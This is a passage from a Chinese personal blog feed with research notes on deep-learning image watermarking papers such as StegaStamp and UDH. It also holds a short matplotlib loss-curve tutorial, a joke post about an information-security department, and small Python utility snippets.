steganography, watermarking, and light field messaging[J]. Advances in Neural Information Processing Systems, 2020, 33: 10223-10234.<br>[63] Zhong X, Huang P C, Mastorakis S, et al. An Automated and Robust Image Watermarking Scheme Based on Deep Neural Networks[J]. IEEE Transactions on Multimedia, 2020.<br>[66] Fang H, Chen D, Wang F, et al. TERA: Screen-to-Camera Image Code with Transparency, Efficiency, Robustness and Adaptability[J]. IEEE Transactions on Multimedia, 2021.</p><h1 id="57-Hidden-Hiding-data-with-deep-networks-（ECCV-2018）（非拍摄）"><a href="#57-Hidden-Hiding-data-with-deep-networks-（ECCV-2018）（非拍摄）" class="headerlink" title="57 Hidden: Hiding data with deep networks.（ECCV 2018）（非拍摄）"></a>57 Hidden: Hiding data with deep networks.（ECCV 2018）（非拍摄）</h1><p>首次提出噪声层的设计并且通过JPEG-Drop对系数采用渐进式滤除。里面没有几何扭曲变形。</p><p>这篇算是第一篇使用深度网络做盲水印的。</p><h2 id="secret类型"><a href="#secret类型" class="headerlink" title="secret类型"></a>secret类型</h2><p>二进制字符串</p><h1 id="60-A-novel-two-stage-separable-deep-learning-framework-for-practical-blind-watermarking（非拍摄-ACM-2019）"><a href="#60-A-novel-two-stage-separable-deep-learning-framework-for-practical-blind-watermarking（非拍摄-ACM-2019）" class="headerlink" title="60 A novel two-stage separable deep learning framework for practical blind watermarking（非拍摄 ACM 2019）"></a>60 A novel two-stage separable deep learning framework for practical blind watermarking（非拍摄 ACM 2019）</h1><p><del>就你叫Peking university啊。</del></p><p>TWO STAGE是分离了编码解码网络的意思，</p><p>采用了不同于前两种的思想，他们将编码器和解码器分离，使得不可微的JPEG压缩损耗仅通过解码器传播，减轻不可微的问题。</p><blockquote><p>we present a <strong>r</strong>edundant <strong>m</strong>ulti-level <strong>f</strong>eature <strong>e</strong>ncoding</p><p><strong>n</strong>etwork (<strong>RMFEN</strong>) as our encoder framework, which involves the</p><p>multi-layer image feat</p></blockquote><p>实际上这篇论文固定了编码网络，或者说是先把编码网络训练到具有一定的攻击鲁棒性，用 __冗余多维度特征编码网络__。训练编码网络的过程没有使用任何隐式或者显式的噪声类型。编码网络里面有有一个残差的强度因子(strength factor)，可以通过这个超参数调整水印强度，这个超参数应该是这个方法的关键。</p><p>很神奇，冗余多维度特征编码网络真的那么厉害吗，能够一下子编码出足够冗余的抗噪声的水印。这种水印生成方式实际上和基于模板的水印在核心思想上很相似，就是固定了编码网络，让编码网络必然具有抗噪声的水印强度。</p><p>本质上，这个方法就是灵活一些 的基于模板的方法。</p><p><img src="/2022/08/05/noise-layer-surver/image-20220805192801233.png" alt="image-20220805192801233"></p><p><img src="/2022/08/05/noise-layer-surver/image-20220805194303108.png" alt="image-20220805194303108"></p><p>这篇文章做的noise倒是很恐怖，是风格转换网络里面跑了一边吧。。。</p><h2 id="两阶段网络"><a href="#两阶段网络" class="headerlink" title="两阶段网络"></a>两阶段网络</h2><p>两阶段网络，在别的任务里面，本人也不是没做过。基本就是那些东西。</p><ul><li>Stage 1 : noise-Free End-to-end Adversary Training  不加入噪声的对抗训练，对抗就是Gan网络的判别器.</li><li>Stage 2 : noise-Aware Decoder-Only Training  使用Stage1的权重。固定编码器，加入噪声，只训练解码器。</li><li>就是要求编码器生成的图像质量不能变化，不能根据噪声自适应。这只能说是有弊有利的措施。</li><li>这个残差的强度因子(strength factor)是可以调的？调整了这个超参数解码真的能解吗。</li></ul><p><img src="/2022/08/05/noise-layer-surver/image-20220805194110580.png" alt="image-20220805194110580"></p><h1 id="56-Light-field-messaging-with-deep-photographic-steganography-cvpr-2019-可拍摄"><a href="#56-Light-field-messaging-with-deep-photographic-steganography-cvpr-2019-可拍摄" class="headerlink" title="56  Light field messaging with deep photographic steganography (cvpr 2019)(可拍摄)"></a>56  Light field messaging with deep photographic steganography (cvpr 2019)(可拍摄)</h1><p>这个挺熟的。LFM。1.9TB的拍摄数据集也是没谁了。可以找到数据集和代码一起的，要license，估计申请了还有等一周它才会通过。</p><p><img src="/2022/08/05/noise-layer-surver/image-20220805151555605.png" alt="image-20220805151555605"></p><p><img src="/2022/08/05/noise-layer-surver/image-20220805151720970.png" alt="image-20220805151720970"></p><p>就是拿T()网络，风格转换网络做桌面拍摄问题的模仿。也不公开模型权重，生气ing。</p><h1 id="58-Distortion-agnostic-deep-watermarking-cvpr-2020-非拍摄"><a href="#58-Distortion-agnostic-deep-watermarking-cvpr-2020-非拍摄" class="headerlink" title="58 Distortion agnostic deep watermarking(cvpr 2020)(非拍摄)"></a>58 Distortion agnostic deep watermarking(cvpr 2020)(非拍摄)</h1><p>利用对抗的思想解决该问题?</p><p><img src="/2022/08/05/noise-layer-surver/image-20220805141910027.png" alt="image-20220805141910027"></p><p>主要有两个部分体现：Channel Encode和Attack Network.</p><h2 id="secret类型-1"><a href="#secret类型-1" class="headerlink" title="secret类型"></a>secret类型</h2><p>二进制字符串</p><h2 id="Channel-Encode"><a href="#Channel-Encode" class="headerlink" title="Channel Encode."></a>Channel Encode.</h2><p><img src="/2022/08/05/noise-layer-surver/image-20220805142043935.png" alt="image-20220805142043935"></p><p>感觉也就那样，源码没有看过，类似ECC编码，带点纠错码的思想，论文里面说是随机进行二进制的反转。通过香农定理的信息冗余实现消息校验。</p><h2 id="Attack-Network"><a href="#Attack-Network" class="headerlink" title="Attack Network."></a>Attack Network.</h2><p><img src="/2022/08/05/noise-layer-surver/image-20220805142340354.png" alt="image-20220805142340354"></p><p>使用一个网络做图像的扰动，有趣的点在于它隐式的加入了噪声层，没有明确加入哪种攻击。就论文展示的效果，还可以。抗干扰的种类还挺多的</p><p><img src="/2022/08/05/noise-layer-surver/image-20220805142319698.png" alt="image-20220805142319698"></p><p><img src="/2022/08/05/noise-layer-surver/image-20220805142853546.png" alt="image-20220805142853546"></p><p><img src="/2022/08/05/noise-layer-surver/image-20220805142632248.png" alt="image-20220805142632248"></p><p>通过loss函数约束网络做disturb。公式3通过公式1简化而来。不过不给我看代码我也看不懂呀。</p><p>用两个alpha超参数约束扰动的强度。失真强度和消息损失函数。</p><p>公式3是什么意思呀？通过L2约束Iadv和Ien接近，就是变化要小；后面那项，提取的F(Iadv)就是reveal secret，X就是in put secret，符号是减号，就是Message的提取要受到干扰的意思，不能被提取网络给提取出秘密信息。</p><p>这样说的话，两个α不平衡好要翻车的。</p><h2 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h2><p><img src="/2022/08/05/noise-layer-surver/image-20220805143144249.png" alt="image-20220805143144249"></p><p>Loss函数不复杂，就是多一个LG，估计是偷了一个Gan网络的什么温彻斯特判别器loss,约束图像质量的。</p><p>思路就很简单了，对抗就体现在扰动网络的loss函数那里。</p><p>按照你这种说法，谁家的网络没有loss函数的对抗(笑).</p><h2 id="train"><a href="#train" class="headerlink" title="train"></a>train</h2><p><img src="/2022/08/05/noise-layer-surver/image-20220805145142653.png" alt="image-20220805145142653"></p><p>训练网络有些门道的，攻击网络的梯度更新在里面</p><h1 id="61-Towards-Robust-Data-Hiding-Against-JPEG-Compression-A-Pseudo-Differentiable-Deep-Learning-Approach-arxiv-2020-不像是能拍摄的样子-一定要读代码"><a href="#61-Towards-Robust-Data-Hiding-Against-JPEG-Compression-A-Pseudo-Differentiable-Deep-Learning-Approach-arxiv-2020-不像是能拍摄的样子-一定要读代码" class="headerlink" title="61 Towards Robust Data Hiding Against (JPEG) Compression: A Pseudo-Differentiable Deep Learning Approach(arxiv 2020;不像是能拍摄的样子,一定要读代码)"></a>61 Towards Robust Data Hiding Against (JPEG) Compression: A Pseudo-Differentiable Deep Learning Approach(arxiv 2020;不像是能拍摄的样子,一定要读代码)</h1><p><em>Chaoning Zhang</em>这个作者好像发挺多论文的</p><p>文献[61]将JPEG压缩视为一种特殊噪声，在反向传播时不经过JPEG压缩部分。</p><p>JPEG（真）是不可微分的，量化表的步骤不可微，印象里这一步要做四舍五入。</p><p>认为可微的JPEG压缩有危害。毕竟压缩不止JPEG压缩一家。最常用JPEG2000，还有MPEG.压缩方法不少，强度不一样。都是基于DCT变换的。</p><blockquote><p>The existing SOTA approaches replace the non-differentiable parts with differentiable modules that perform similar operations. Multiple limitations exist: (a) large engineering effort; (b) requiring a white-box knowledge of compression attacks; (c) only works for simple compression like JPEG. In this work, we propose a simple yet effective approach to address all the above limitations at once. Beyond JPEG, our approach has been shown to improve robustness against various image and video lossy compression algorithms</p></blockquote><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>这个链接里面好像没有什么东西，作者删库跑路</p><p><a href="https://github.com/mikolez/Robust_JPEG">https://github.com/mikolez/Robust_JPEG</a></p><blockquote><h2 id="JPEG模拟论文"><a href="#JPEG模拟论文" class="headerlink" title="JPEG模拟论文"></a>JPEG模拟论文</h2><ul><li><p>Richard Shin and Dawn Song, “Jpeg-resistant adversarial images,” in *NIPS 2017 Workshop on Machine Learning and Computer Security, 2017.</p></li><li><p>JPEG-Mask and JPEG-Drop in Hidden(ECCV 2018) 斯坦福那篇水印文章</p></li></ul></blockquote><p>假的可微JPEG和真的JPEG还是有区别的。</p><h2 id="把-真-JPEG压缩转可微-有趣"><a href="#把-真-JPEG压缩转可微-有趣" class="headerlink" title="把(真)JPEG压缩转可微(有趣)"></a>把(真)JPEG压缩转可微(有趣)</h2><ul><li><p><strong>噪声是可微的，把JPEG压缩看作是依赖于载体的伪噪声</strong></p></li><li><p>图3所示方法。先减去再加上。就可微了。看似没有意义，但是确实是变得可微了。</p></li><li><p>原则上，这种方法可以用于任何不可微的操作。</p></li></ul><p><img src="/2022/08/05/noise-layer-surver/image-20220805201739199.png" alt="image-20220805201739199"></p><h1 id="StegaStamp-Invisible-Hyperlinks-in-Physical-Photographs-cvpr-2020-拍摄"><a href="#StegaStamp-Invisible-Hyperlinks-in-Physical-Photographs-cvpr-2020-拍摄" class="headerlink" title="StegaStamp: Invisible Hyperlinks in Physical Photographs(cvpr 2020)(拍摄)"></a>StegaStamp: Invisible Hyperlinks in Physical Photographs(cvpr 2020)(拍摄)</h1><p><a href="https://github.com/tancik/StegaStamp">https://github.com/tancik/StegaStamp</a></p><p>有代码有权重，有网站。和某些文章相比高下立判。</p><p>解码网络用了STN（空间变换网络），看文章的时候容易漏掉。</p><p><img src="/2022/08/05/noise-layer-surver/image-20220805152900552.png" alt="image-20220805152900552"></p><p><img src="/2022/08/05/noise-layer-surver/image-20220805152926833.png" alt="image-20220805152926833"></p><p><strong>很重要的一篇文章，读个4-5遍</strong>。主要是通过显性的扰动模拟拍摄，主要是纸媒的拍摄，屏幕拍摄估计也行，就是如果用他的dectection网络，得把屏幕塞到四方的白框里面。像是下面这样。毕竟人家的detection网络就是这样训练的一个物体识别网络。</p><h2 id="noise-layer"><a href="#noise-layer" class="headerlink" title="noise layer"></a>noise layer</h2><p>从0开始的强度渐变。要求先几何变换，再图像处理。</p><h2 id="可能的不足"><a href="#可能的不足" class="headerlink" title="可能的不足"></a>可能的不足</h2><p>这篇是算是到2020年的集大成者了。可惜固定了图像大小是400*400的，因为加入了字符串的secret的全连接网络reshape。</p><p><img src="/2022/08/05/noise-layer-surver/image-20220805153413053.png" alt="image-20220805153413053"></p><h2 id="secret类型-2"><a href="#secret类型-2" class="headerlink" title="secret类型"></a>secret类型</h2><p>还是二进制字符串，实验得出50还是100bit的长度比较好。</p><h1 id="62-Udh-Universal-deep-hiding-for-steganography-watermarking-and-light-field-messaging-NIPS-2020-据说是可拍摄的"><a href="#62-Udh-Universal-deep-hiding-for-steganography-watermarking-and-light-field-messaging-NIPS-2020-据说是可拍摄的" class="headerlink" title="62 Udh: Universal deep hiding for steganography, watermarking, and light field messaging(NIPS 2020)(据说是可拍摄的)"></a>62 Udh: Universal deep hiding for steganography, watermarking, and light field messaging(NIPS 2020)(据说是可拍摄的)</h1><p><strong>给了源码，没有给权重，源码是PyTorch写的</strong></p><p><a href="https://github.com/ChaoningZhang/Universal-Deep-Hiding">https://github.com/ChaoningZhang/Universal-Deep-Hiding</a></p><p>法[62]提出了一种新的分类策略，他们将每批数据再分组，每组包含一种攻击类型，每批包含所有攻击类型。这种新策略使得网络收敛的更快？</p><p>这篇论文没有怎么写训练拍摄的noise layer吧。代码写的也不是很清楚，没有看明白它的noise layer是怎么跑的。</p><p><img src="/2022/08/05/noise-layer-surver/image-20220805155020831.png" alt="image-20220805155020831"></p><p>UDH 算是重要的一个深度水印分类,在某些情景下有很大作用</p><h2 id="secret类型-3"><a href="#secret类型-3" class="headerlink" title="secret类型"></a>secret类型</h2><p>二值图像，可以放多张图像。</p><h2 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h2><ul><li>在于无法应对亮度过高的图像，毕竟这是一点cover信息都没有给，生成的res当然不会管大小正负的。</li><li>JPEG不行。很怀疑JPEG不行是怎么做到拍摄的，这和StegaStamp的理论矛盾了。其实不管JPEG压缩的话，隐藏效果可以做的很好是肯定的，如果网络不是拿脚写的。</li></ul><h1 id="59-ReDMark-Framework-for-residual-diffusion-watermarking-based-on-deep-networks（明显不可能拍摄；-Expert-Systems-with-Applications-2020-）"><a href="#59-ReDMark-Framework-for-residual-diffusion-watermarking-based-on-deep-networks（明显不可能拍摄；-Expert-Systems-with-Applications-2020-）" class="headerlink" title="59 ReDMark: Framework for residual diffusion watermarking based on deep networks（明显不可能拍摄； Expert Systems with Applications 2020 ）"></a>59 ReDMark: Framework for residual diffusion watermarking based on deep networks（明显不可能拍摄； Expert Systems with Applications 2020 ）</h1><p>没有细看。</p><p>通过设计一系列可微分的函数来模拟JPEG压缩的每一步。在训练时，每批训练一种单一类型的失真，交替训练。</p><p>我的惨痛经历告诉我，每个epoch 做一种扰动是绝对不行的。</p><h2 id="常规的网络框架"><a href="#常规的网络框架" class="headerlink" title="常规的网络框架"></a>常规的网络框架</h2><p><img src="/2022/08/05/noise-layer-surver/image-20220805163323692.png" alt="image-20220805163323692"></p><p><img src="/2022/08/05/noise-layer-surver/image-20220805163619470.png" alt="image-20220805163619470"></p><p><img src="/2022/08/05/noise-layer-surver/image-20220805163644338.png" alt="image-20220805163644338"></p><h2 id="JPEG可微压缩"><a href="#JPEG可微压缩" class="headerlink" title="JPEG可微压缩"></a>JPEG可微压缩</h2><p><img src="/2022/08/05/noise-layer-surver/image-20220805162920686.png" alt="image-20220805162920686"></p><h2 id="每个epoch-判定一次扰动，幸运转盘？"><a href="#每个epoch-判定一次扰动，幸运转盘？" class="headerlink" title="每个epoch 判定一次扰动，幸运转盘？"></a>每个epoch 判定一次扰动，幸运转盘？</h2><p><img src="/2022/08/05/noise-layer-surver/image-20220805162950114.png" alt="image-20220805162950114"></p><h1 id="63-an-Automated-and-Robust-Image-Watermarking-Scheme-Based-on-Deep-Neural-Networks-拍照-IEEE-Transactions-on-Multimedia-2020"><a href="#63-an-Automated-and-Robust-Image-Watermarking-Scheme-Based-on-Deep-Neural-Networks-拍照-IEEE-Transactions-on-Multimedia-2020" class="headerlink" title="63  an Automated and Robust Image Watermarking Scheme Based on Deep Neural Networks(拍照?  IEEE Transactions on Multimedia 2020)"></a>63  an Automated and Robust Image Watermarking Scheme Based on Deep Neural Networks(拍照?  IEEE Transactions on Multimedia 2020)</h1><p>文献[63]中提出了一个不变空间的新方法，他们在训练时不引入任何攻击，而是通过一个全连接层，将编码器生成的3通道信息映射到N通道上，解码器基于N通道信息（不变空间）解码。从实验结果显示，他们的算法对于某些攻击达到了较好的效果。</p><p>感觉不过是转化了数据域。</p><p><img src="/2022/08/05/noise-layer-surver/image-20220805160418378.png" alt="image-20220805160418378"></p><p><img src="/2022/08/05/noise-layer-surver/image-20220805160933210.png" alt="image-20220805160933210"></p><p><img src="/2022/08/05/noise-layer-surver/image-20220805161137987.png" alt="image-20220805161137987"></p><p>这玩意都能拍照吗？</p><h2 id="secret类型-4"><a href="#secret类型-4" class="headerlink" title="secret类型"></a>secret类型</h2><p>二进制图像，把字符编码成横和圈。其他的二进制图像也行。</p><h1 id="TERA-Screen-to-Camera-Image-Code-with-Transparency-Efficiency-Robustness-and-Adaptability-拍摄-IEEE-Transactions-on-Multimedia-2021"><a href="#TERA-Screen-to-Camera-Image-Code-with-Transparency-Efficiency-Robustness-and-Adaptability-拍摄-IEEE-Transactions-on-Multimedia-2021" class="headerlink" title="TERA: Screen-to-Camera Image Code with Transparency, Efficiency, Robustness and Adaptability(拍摄 IEEE Transactions on Multimedia, 2021.)"></a>TERA: Screen-to-Camera Image Code with Transparency, Efficiency, Robustness and Adaptability(拍摄 IEEE Transactions on Multimedia, 2021.)</h1><p>基于模板的水印，固定了编码器的前提下，可以直接拍摄，不需要考虑可微的问题。</p><p>使用直接拍摄代替noise layer。很暴力</p><p><img src="/2022/08/05/noise-layer-surver/image-20220805162345071.png" alt="image-20220805162345071"></p><h2 id="secret-类型"><a href="#secret-类型" class="headerlink" title="secret 类型"></a>secret 类型</h2><p>算是二值字符，还是二维码。就基于模板的水印而言，应该算是二维码更加贴切。</p>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cv </tag>
            
            <tag> 水印 </tag>
            
            <tag> 可拍摄 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文loss曲线绘制方法</title>
      <link href="/2022/08/04/%E8%AE%BA%E6%96%87loss%E6%9B%B2%E7%BA%BF%E7%BB%98%E5%88%B6%E6%96%B9%E6%B3%95/"/>
      <url>/2022/08/04/%E8%AE%BA%E6%96%87loss%E6%9B%B2%E7%BA%BF%E7%BB%98%E5%88%B6%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="1-先用tensorboard把loss曲线做出来"><a href="#1-先用tensorboard把loss曲线做出来" class="headerlink" title="1  先用tensorboard把loss曲线做出来"></a>1  先用tensorboard把loss曲线做出来</h1><p>这一步还是不够的，因为tensorboard直接下载的矢量图的格式是不符合论文规范的。比如起点不在原点，坐标轴没有图例之类的大人的原因。</p><h1 id="2-从tensorboard里面下载csv数据"><a href="#2-从tensorboard里面下载csv数据" class="headerlink" title="2 从tensorboard里面下载csv数据"></a>2 从tensorboard里面下载csv数据</h1><p><img src="/2022/08/04/%E8%AE%BA%E6%96%87loss%E6%9B%B2%E7%BA%BF%E7%BB%98%E5%88%B6%E6%96%B9%E6%B3%95/image-20220804085356686.png" alt="image-20220804085356686"></p><p><img src="/2022/08/04/%E8%AE%BA%E6%96%87loss%E6%9B%B2%E7%BA%BF%E7%BB%98%E5%88%B6%E6%96%B9%E6%B3%95/image-20220804085433667.png" alt="image-20220804085433667"></p><h1 id="3-python画表"><a href="#3-python画表" class="headerlink" title="3 python画表"></a>3 python画表</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">table3</span>():</span><br><span class="line">    <span class="comment"># train-val变化曲线  其他noise layer</span></span><br><span class="line">    mpl.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]  <span class="comment"># 添加这条可以让图形显示中文</span></span><br><span class="line">    y_axis_data_train = [<span class="number">0.164287627</span>,</span><br><span class="line"><span class="number">0.106327094</span>,</span><br><span class="line"></span><br><span class="line">                   ]</span><br><span class="line">    x_axis_data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        x_axis_data.append(i)</span><br><span class="line">    y_axis_data_val = [<span class="number">0.083114974</span>,</span><br><span class="line"><span class="number">0.072642237</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">    plt.figure()</span><br><span class="line">    <span class="comment"># plot中参数的含义分别是横轴值，纵轴值，线的形状，颜色，透明度,线的宽度和标签</span></span><br><span class="line">    plt.plot(x_axis_data, y_axis_data_train, <span class="string">&#x27;-&#x27;</span>, color=<span class="string">&#x27;#0000FF&#x27;</span>, alpha=<span class="number">1</span>, linewidth=<span class="number">1</span>, label=<span class="string">&#x27;train&#x27;</span>)</span><br><span class="line">    plt.plot(x_axis_data, y_axis_data_val, <span class="string">&#x27;-&#x27;</span>, color=<span class="string">&#x27;#FF0000&#x27;</span>, alpha=<span class="number">1</span>, linewidth=<span class="number">1</span>, label=<span class="string">&#x27;val&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 显示标签，如果不加这句，即使在plot中加了label=&#x27;一些数字&#x27;的参数，最终还是不会显示标签</span></span><br><span class="line">    plt.legend(loc=<span class="string">&quot;upper left&quot;</span>,fontsize = <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    plt.yticks(fontsize=<span class="number">15</span>)</span><br><span class="line">    plt.xticks(fontsize=<span class="number">15</span>)</span><br><span class="line">    plt.xlim(<span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    plt.xlabel(<span class="string">&#x27;epoch&#x27;</span>, fontsize=<span class="number">18</span>)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;loss&#x27;</span>, fontsize=<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    plt.show()</span><br><span class="line">    plt.savefig(<span class="string">&#x27;demo.png&#x27;</span>)  <span class="comment"># 保存该图片</span></span><br></pre></td></tr></table></figure><p>不直接复制数据，可以读取表格</p><h1 id="4-复制图片，转dpi"><a href="#4-复制图片，转dpi" class="headerlink" title="4 复制图片，转dpi"></a>4 复制图片，转dpi</h1><p><a href="https://convert.town/image-dpi">https://convert.town/image-dpi</a></p><p>给300还是600的dpi</p><h1 id="5-完成"><a href="#5-完成" class="headerlink" title="5 完成"></a>5 完成</h1>]]></content>
      
      
      <categories>
          
          <category> python小项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信安系笑话永不过时</title>
      <link href="/2022/08/02/%E4%BF%A1%E5%AE%89%E7%B3%BB%E5%9C%B0%E7%8B%B1%E7%AC%91%E8%AF%9D/"/>
      <url>/2022/08/02/%E4%BF%A1%E5%AE%89%E7%B3%BB%E5%9C%B0%E7%8B%B1%E7%AC%91%E8%AF%9D/</url>
      
        <content type="html"><![CDATA[<p>千万不能被人看见！！</p><p>我信安19届乃是历代最强，谁赞成，谁反对？</p><h1 id="信安系导师各个是人才，说话又好听。"><a href="#信安系导师各个是人才，说话又好听。" class="headerlink" title="信安系导师各个是人才，说话又好听。"></a>信安系导师各个是人才，说话又好听。</h1><p>《可能是培养方案改变的问题，19级是第一届的试行方案，导致了本系19级的水平远不如以往几届》——也许是培养方案的问题，看来20届的水平略不如19届，主要原因是19届有S先生在。可能是培养方案改变的问题，20级是第2届的试行，导致了本系20级的水平远不如以往几届。建议以后，每年都这样写。</p><p>《作品赛这个竞赛还是很好拿奖的，三等奖随随便便就拿了》——指今年预赛都进不了几个</p><p>《今年的成绩还不错，有个二等奖，还是和计科合作的》——“合作”：出了200块参赛费</p><p>《好，我有颜良文丑二将，看来今年一个二等一个三等是稳了》——“稳了”指国赛总共进2个</p><h1 id="正经の信安系地狱笑话"><a href="#正经の信安系地狱笑话" class="headerlink" title="正经の信安系地狱笑话"></a>正经の信安系地狱笑话</h1><p>在你校，信安国赛往往特指作品赛。<br>你问为什么？你校压根没进过实践赛的国赛</p><h1 id="第15届信安国赛罪己"><a href="#第15届信安国赛罪己" class="headerlink" title="第15届信安国赛罪己"></a>第15届信安国赛罪己</h1><p>还是本人行为前后不一的问题，算法确实是一流的。</p><p>本人的最初目的或者说所谓的初心，有三：杀穿竞赛，锻炼后辈，偷偷摸鱼。</p><p>这三个目的在某些情况下确实是可以满足的，但是今年的条件不足。</p><p>想要混一个一等需要本人亲自操刀文案和PPT。</p><p>但是本人又是不可能一开始就干这种苦力的。</p><p>时间足则学弟练手，时间不足则本人托底。</p><p>以至亲自动手之后的修改时间不足，讲述逻辑没有时间理顺。</p><p>不如说自从本人打算摸鱼的那一刻开始，此次竞赛的上限便是二等。</p><p>而本次的讲述逻辑确实不如第14届。</p><p>区区三等也没有什么办法。</p><h1 id="局势图"><a href="#局势图" class="headerlink" title="局势图"></a>局势图</h1><p>昔十四届赛，浙三本得二等者二，三等者一；而主得二等者一，三等者二。诛浙三本，得浙之社稷，已近在咫尺。</p><p>今十五届赛，浙三本竟得一等者一；而主唯得三等者一。诛浙三本，遥遥无期，可悲可叹。夫可诛浙三本者，工商也；救工商者，我辈也；望工商好自为之，勿谓言之不欲也。</p>]]></content>
      
      
      <categories>
          
          <category> 地狱笑话 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文引用首字母排排序</title>
      <link href="/2022/07/18/%E8%AE%BA%E6%96%87%E5%BC%95%E7%94%A8%E9%A6%96%E5%AD%97%E6%AF%8D%E6%8E%92%E6%8E%92%E5%BA%8F/"/>
      <url>/2022/07/18/%E8%AE%BA%E6%96%87%E5%BC%95%E7%94%A8%E9%A6%96%E5%AD%97%E6%AF%8D%E6%8E%92%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">paixu</span>(<span class="params">list_line</span>):</span><br><span class="line">    list_line.sort()</span><br><span class="line">    <span class="keyword">return</span> list_line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    list_line = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(line)&gt;<span class="number">10</span>:</span><br><span class="line">                <span class="built_in">print</span>(line[<span class="number">4</span>:])</span><br><span class="line">                line= line[<span class="number">4</span>:]</span><br><span class="line">                list_line.append(line.strip())</span><br><span class="line">    list_line =paixu(list_line)</span><br><span class="line">    <span class="built_in">print</span>(list_line)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> list_line:</span><br><span class="line">            f.write(line)</span><br><span class="line">            f.write(<span class="string">&quot;\n\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/%E8%AE%BA%E6%96%87%E5%BC%95%E7%94%A8%E9%A6%96%E5%AD%97%E6%AF%8D%E6%8E%92%E6%8E%92%E5%BA%8F%5Cimage-20220718103419830.png" alt="image-20220718103419830"></p><p>可以把这样的格式，变成那样的格式，根据作者首字母排序</p><p><img src="/%E8%AE%BA%E6%96%87%E5%BC%95%E7%94%A8%E9%A6%96%E5%AD%97%E6%AF%8D%E6%8E%92%E6%8E%92%E5%BA%8F%5Cimage-20220718103351716.png" alt="image-20220718103351716"></p>]]></content>
      
      
      <categories>
          
          <category> python小项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cv </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>断言式</title>
      <link href="/2022/07/01/python%E6%96%AD%E8%A8%80%E5%BC%8F/"/>
      <url>/2022/07/01/python%E6%96%AD%E8%A8%80%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">branches =<span class="number">1</span></span><br><span class="line">x= <span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> (branches) == (x)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>__assert__语句其实可以当作一个try exception使用</p><p>不满足条件即程序中断</p>]]></content>
      
      
      <categories>
          
          <category> python小项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cv </tag>
            
            <tag> python </tag>
            
            <tag> 透明度 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生成有透明度的数字签名</title>
